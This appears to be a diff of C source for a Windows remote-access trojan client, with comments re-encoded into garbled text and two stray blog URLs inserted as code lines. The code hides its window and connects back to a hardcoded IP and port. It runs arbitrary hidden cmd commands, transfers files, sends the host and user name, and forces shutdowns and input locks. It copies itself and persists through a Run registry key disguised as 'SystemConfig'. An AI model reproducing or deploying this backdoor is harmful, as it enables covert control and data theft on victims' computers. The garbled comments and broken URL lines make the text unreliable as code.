@@ -4,8 +4,8 @@
 #include <windows.h>
 #include <winable.h>
 #pragma comment(lib, "ws2_32.lib")
-
-
+https://blog.csdn.net/Rock_y/article/details/107090790
+https://blog.csdn.net/Rock_y/article/details/107293102
 #ifdef _MSC_VER  
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
@@ -14,12 +14,12 @@
 #define MSG_LENN 5120
 
 
-int ServerPort = 8083;  //Á¬½ÓµÄ¶Ë¿Ú
-char ServerAddr[] = "192.168.88.133"; //·´µ¯Á¬½ÓµÄÓòÃû
+int ServerPort = 8083;  //è¿æ¥çš„ç«¯å£
+char ServerAddr[] = "192.168.88.133"; //åå¼¹è¿æ¥çš„åŸŸå
 int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);
 
 
-// ·¢ËÍÎÄ¼ş
+// å‘é€æ–‡ä»¶
 int sendFile(SOCKET client, char *filename) 
 {		
     char sendbuf[1024];
@@ -31,7 +31,7 @@ int sendFile(SOCKET client, char *filename)
 	if(hFile==INVALID_HANDLE_VALUE) {
 		return 1;
 	}
-    while(1) {  //·¢ËÍÎÄ¼şµÄbuf
+    while(1) {  //å‘é€æ–‡ä»¶çš„buf
         bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
         if(bRet==FALSE) break;
         else if(dwRead==0) {
@@ -50,13 +50,13 @@ int sendFile(SOCKET client, char *filename)
 	return 0;
 }
 
-// ½ÓÊÜÎÄ¼ş
+// æ¥å—æ–‡ä»¶
 int recvFile(SOCKET client, char *filename) 
 {
 	int len;
-    char recvBuf[1024] = {0};   // »º³åÇø
-    HANDLE hFile;               // ÎÄ¼ş¾ä±ú
-    DWORD count;                // Ğ´ÈëµÄÊı¾İ¼ÆÊı
+    char recvBuf[1024] = {0};   // ç¼“å†²åŒº
+    HANDLE hFile;               // æ–‡ä»¶å¥æŸ„
+    DWORD count;                // å†™å…¥çš„æ•°æ®è®¡æ•°
  
     hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
 	if(hFile==INVALID_HANDLE_VALUE) {
@@ -64,7 +64,7 @@ int recvFile(SOCKET client, char *filename)
 	}
 	send(client,"BEGIN",6,0);
     while (1) {
-        // ´Ó¿Í»§¶Ë¶ÁÊı¾İ
+        // ä»å®¢æˆ·ç«¯è¯»æ•°æ®
 		ZeroMemory(recvBuf, sizeof(recvBuf));   
 		len = recv(client, recvBuf, 1024, 0);
         if (strlen(recvBuf) < 5) {
@@ -80,39 +80,39 @@ int recvFile(SOCKET client, char *filename)
 	return 0;
 }
 
-// Ö´ĞĞCMDÃüÁî£¬¹ÜµÀ´«Êä
+// æ‰§è¡ŒCMDå‘½ä»¤ï¼Œç®¡é“ä¼ è¾“
 int cmd(char *cmdStr, char *message)
 {
     DWORD readByte = 0;
     char command[1024] = {0};
-    char buf[MSG_LENN] = {0}; //»º³åÇø
+    char buf[MSG_LENN] = {0}; //ç¼“å†²åŒº
  
     HANDLE hRead, hWrite;
-    STARTUPINFO si;         // Æô¶¯ÅäÖÃĞÅÏ¢
-    PROCESS_INFORMATION pi; // ½ø³ÌĞÅÏ¢
-    SECURITY_ATTRIBUTES sa; // ¹ÜµÀ°²È«ÊôĞÔ
+    STARTUPINFO si;         // å¯åŠ¨é…ç½®ä¿¡æ¯
+    PROCESS_INFORMATION pi; // è¿›ç¨‹ä¿¡æ¯
+    SECURITY_ATTRIBUTES sa; // ç®¡é“å®‰å…¨å±æ€§
  
-    // ÅäÖÃ¹ÜµÀ°²È«ÊôĞÔ
+    // é…ç½®ç®¡é“å®‰å…¨å±æ€§
     sa.nLength = sizeof( sa );
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
  
-    // ´´½¨ÄäÃû¹ÜµÀ£¬¹ÜµÀ¾ä±úÊÇ¿É±»¼Ì³ĞµÄ
+    // åˆ›å»ºåŒ¿åç®¡é“ï¼Œç®¡é“å¥æŸ„æ˜¯å¯è¢«ç»§æ‰¿çš„
 	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
         return 1;
     }
  
-    // ÅäÖÃ cmd Æô¶¯ĞÅÏ¢
+    // é…ç½® cmd å¯åŠ¨ä¿¡æ¯
     ZeroMemory( &si, sizeof( si ) );
-    si.cb = sizeof( si ); // »ñÈ¡¼æÈİ´óĞ¡
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ±ê×¼Êä³öµÈÊ¹ÓÃ¶îÍâµÄ
-    si.wShowWindow = SW_HIDE;               // Òş²Ø´°¿ÚÆô¶¯
-    si.hStdOutput = si.hStdError = hWrite;  // Êä³öÁ÷ºÍ´íÎóÁ÷Ö¸Ïò¹ÜµÀĞ´µÄÒ»Í·
+    si.cb = sizeof( si ); // è·å–å…¼å®¹å¤§å°
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // æ ‡å‡†è¾“å‡ºç­‰ä½¿ç”¨é¢å¤–çš„
+    si.wShowWindow = SW_HIDE;               // éšè—çª—å£å¯åŠ¨
+    si.hStdOutput = si.hStdError = hWrite;  // è¾“å‡ºæµå’Œé”™è¯¯æµæŒ‡å‘ç®¡é“å†™çš„ä¸€å¤´
 
-	// Æ´½Ó cmd ÃüÁî
+	// æ‹¼æ¥ cmd å‘½ä»¤
 	sprintf(command, "cmd.exe /c %s", cmdStr);
  
-    // ´´½¨×Ó½ø³Ì,ÔËĞĞÃüÁî,×Ó½ø³ÌÊÇ¿É¼Ì³ĞµÄ
+    // åˆ›å»ºå­è¿›ç¨‹,è¿è¡Œå‘½ä»¤,å­è¿›ç¨‹æ˜¯å¯ç»§æ‰¿çš„
     if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
         CloseHandle( hRead );
         CloseHandle( hWrite );
@@ -121,7 +121,7 @@ int cmd(char *cmdStr, char *message)
     }
     CloseHandle( hWrite );
   
-    //¶ÁÈ¡¹ÜµÀµÄread¶Ë,»ñµÃcmdÊä³ö
+    //è¯»å–ç®¡é“çš„readç«¯,è·å¾—cmdè¾“å‡º
     while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
         strcat(message, buf);
         ZeroMemory( buf, MSG_LENN );
@@ -135,7 +135,7 @@ int cmd(char *cmdStr, char *message)
 void c_socket() 
 {
 
-	// ³õÊ¼»¯ Winsock
+	// åˆå§‹åŒ– Winsock
 	WSADATA wsaData;
 	struct hostent *host;
 	struct in_addr addr;
@@ -146,7 +146,7 @@ void c_socket()
 	}
 	while(1){
 
-		//½âÎöÖ÷»úµØÖ·
+		//è§£æä¸»æœºåœ°å€
 		host = gethostbyname(ServerAddr);
 		if( host == NULL ) {
 			Sleep(20000);
@@ -157,7 +157,7 @@ void c_socket()
 		}
 	}
 
-	// ½¨Á¢socket socket.
+	// å»ºç«‹socket socket.
 	SOCKET client;
 	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
 	if ( client == INVALID_SOCKET ) {
@@ -166,7 +166,7 @@ void c_socket()
 		return;
 	}
 
-	//»ñÈ¡Ö÷»úÃû¡¢ÓÃ»§Ãû
+	//è·å–ä¸»æœºåã€ç”¨æˆ·å
 	char userName[20]={0};
 	char comName[20]={0};
 	char comInfo[40]={0};
@@ -176,7 +176,7 @@ void c_socket()
 	GetComputerName(comName,&comLen);
 	sprintf(comInfo, "%s#%s", comName, userName);
 
-	// Á¬½Óµ½·şÎñÆ÷.
+	// è¿æ¥åˆ°æœåŠ¡å™¨.
 	sockaddr_in clientService;
 	clientService.sin_family = AF_INET;
 	//clientService.sin_addr.s_addr = inet_addr("10.0.0.4");
@@ -193,16 +193,16 @@ void c_socket()
 		}
 	}
 
-	//×èÈûµÈ´ı·şÎñ¶ËÖ¸Áî
+	//é˜»å¡ç­‰å¾…æœåŠ¡ç«¯æŒ‡ä»¤
 	char recvCmd[MSG_LEN] = {0};
 	char message[MSG_LENN+10] = {0};
 	while(1) {
 		ZeroMemory(recvCmd, sizeof(recvCmd));
 		ZeroMemory(message,sizeof(message));
 
-		//´Ó·şÎñ¶Ë»ñÈ¡Êı¾İ
+		//ä»æœåŠ¡ç«¯è·å–æ•°æ®
         recv(client, recvCmd, MSG_LEN, 0);
-		if(strlen(recvCmd)<1){  //SOCKETÖĞ¶ÏÖØÁ¬
+		if(strlen(recvCmd)<1){  //SOCKETä¸­æ–­é‡è¿
 			closesocket(client);
 			while(1){
 				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -216,16 +216,16 @@ void c_socket()
 				}
 			}
 			continue;
-		}else if(strcmp(recvCmd,"shutdown")==0){  //¹Ø»ú
+		}else if(strcmp(recvCmd,"shutdown")==0){  //å…³æœº
 			system("shutdown -s -t 1");
 			continue;
-		}else if(strcmp(recvCmd,"reboot")==0){  //ÖØÆô
+		}else if(strcmp(recvCmd,"reboot")==0){  //é‡å¯
 			system("shutdown -r -t 10");
 			continue;
-		}else if(strcmp(recvCmd,"cancel")==0){  //È¡Ïû¹Ø»ú
+		}else if(strcmp(recvCmd,"cancel")==0){  //å–æ¶ˆå…³æœº
 			system("shutdown -a");
 			continue;
-		}else if(strcmp(recvCmd,"kill-client")==0){  //¹Ø±Õ¿Í»§¶Ë
+		}else if(strcmp(recvCmd,"kill-client")==0){  //å…³é—­å®¢æˆ·ç«¯
 			send(client,"Client has exit!", 18, 0);
 			exit(0);
 		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
@@ -235,32 +235,32 @@ void c_socket()
 			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
 				CMD[i-1] = recvCmd[i];
 			}
-			if(recvCmd[0] == '$') {  //Ö´ĞĞÈÎÒâÖ¸Áî
+			if(recvCmd[0] == '$') {  //æ‰§è¡Œä»»æ„æŒ‡ä»¤
 				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
 				else send(client,"CMD Error!\n",13,0);
-			}else {  //µ¯´°
+			}else {  //å¼¹çª—
 				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
 			}
 			continue;
-		}else if(strcmp(recvCmd,"lock")==0){ //ËøÆÁ
+		}else if(strcmp(recvCmd,"lock")==0){ //é”å±
 			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
 			continue;
-		}else if(strcmp(recvCmd,"blockinput")==0){ //¶³½áÊó±êºÍ¼üÅÌ
+		}else if(strcmp(recvCmd,"blockinput")==0){ //å†»ç»“é¼ æ ‡å’Œé”®ç›˜
 			BlockInput(true);
 			Sleep(5000);
 			BlockInput(false);
 			continue;
-		}else if(strcmp(recvCmd,"mouse")==0){ //ÖØÖÃ¹â±ê
+		}else if(strcmp(recvCmd,"mouse")==0){ //é‡ç½®å…‰æ ‡
 			SetCursorPos(0,0);
 			continue;
-		}else if(strcmp(recvCmd,"download")==0){ //ÉÏ´«ÎÄ¼ş
+		}else if(strcmp(recvCmd,"download")==0){ //ä¸Šä¼ æ–‡ä»¶
 			ZeroMemory(recvCmd, sizeof(recvCmd));
 			recv(client, recvCmd, MSG_LEN, 0);
 			if(sendFile(client,recvCmd)) {
 				send(client,"EOFNN",strlen("EOFNN")+1,0);
 			}
 			continue;
-		}else if(strcmp(recvCmd,"upload")==0){ //ÏÂÔØÎÄ¼ş
+		}else if(strcmp(recvCmd,"upload")==0){ //ä¸‹è½½æ–‡ä»¶
 			ZeroMemory(recvCmd, sizeof(recvCmd));
 			recv(client, recvCmd, MSG_LEN, 0);
 			if(recvFile(client,recvCmd)){
@@ -275,7 +275,7 @@ void c_socket()
     return;
 }
 
-//×ÔÉí¸´ÖÆ
+//è‡ªèº«å¤åˆ¶
 int copySelf(char *path)
 {
 	char fileName[MAX_PATH];
@@ -293,30 +293,30 @@ int autoRun(char *path)
     HKEY hKey;
     DWORD result;
  
-    //´ò¿ª×¢²á±í
+    //æ‰“å¼€æ³¨å†Œè¡¨
     result = RegOpenKeyEx(
         HKEY_LOCAL_MACHINE,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Òª´ò¿ªµÄ×¢²á±íÏîÃû³Æ
-        0,              // ±£Áô²ÎÊı±ØĞëÌî 0
-        KEY_SET_VALUE,  // ´ò¿ªÈ¨ÏŞ£¬Ğ´Èë
-        &hKey           // ´ò¿ªÖ®ºóµÄ¾ä±ú
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // è¦æ‰“å¼€çš„æ³¨å†Œè¡¨é¡¹åç§°
+        0,              // ä¿ç•™å‚æ•°å¿…é¡»å¡« 0
+        KEY_SET_VALUE,  // æ‰“å¼€æƒé™ï¼Œå†™å…¥
+        &hKey           // æ‰“å¼€ä¹‹åçš„å¥æŸ„
     );
 
     if (result != ERROR_SUCCESS) return 0;
 
-    // ÔÚ×¢²á±íÖĞÉèÖÃ(Ã»ÓĞÔò»áĞÂÔöÒ»¸öÖµ)
+    // åœ¨æ³¨å†Œè¡¨ä¸­è®¾ç½®(æ²¡æœ‰åˆ™ä¼šæ–°å¢ä¸€ä¸ªå€¼)
     result = RegSetValueEx(
                  hKey,
-                 "SystemConfig", // ¼üÃû
-                 0,                  // ±£Áô²ÎÊı±ØĞëÌî 0
-                 REG_SZ,             // ¼üÖµÀàĞÍÎª×Ö·û´®
-                 (const unsigned char *)path, // ×Ö·û´®Ê×µØÖ·
-                 strlen(path)        // ×Ö·û´®³¤¶È
+                 "SystemConfig", // é”®å
+                 0,                  // ä¿ç•™å‚æ•°å¿…é¡»å¡« 0
+                 REG_SZ,             // é”®å€¼ç±»å‹ä¸ºå­—ç¬¦ä¸²
+                 (const unsigned char *)path, // å­—ç¬¦ä¸²é¦–åœ°å€
+                 strlen(path)        // å­—ç¬¦ä¸²é•¿åº¦
              );
 
     if (result != ERROR_SUCCESS) return 0;
  
-    //¹Ø±Õ×¢²á±í:
+    //å…³é—­æ³¨å†Œè¡¨:
     RegCloseKey(hKey);
 
     return 0;
